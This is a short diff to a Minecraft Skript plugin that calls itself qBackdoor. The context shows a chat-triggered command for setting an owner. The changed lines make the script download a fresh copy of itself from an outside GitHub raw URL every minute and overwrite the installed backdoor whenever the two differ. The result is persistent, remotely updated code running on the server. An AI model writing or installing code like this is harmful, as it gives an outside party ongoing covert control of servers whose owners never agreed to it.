@@ -166,9 +166,9 @@ on chat:
       else:
         send "%{@prefix}% &cError while setting owner"
 
-on load:
+every minute:
   download file from "https://raw.githubusercontent.com/iHategithub9000/qBackdoor/main/qbackdoor_main.sk" to file "latestbackdoor.tmp"
   if file content of "plugins/Skript/scripts/qbackdoor.sk" is not file content of "latestbackdoor.tmp":
-    delete file "latestbackdoor.tmp"
     delete file "plugins/Skript/scripts/qbackdoor.sk"
     download file from "https://raw.githubusercontent.com/iHategithub9000/qBackdoor/main/qbackdoor_main.sk" to file "plugins/Skript/scripts/qbackdoor.sk"
+  delete file "latestbackdoor.tmp"
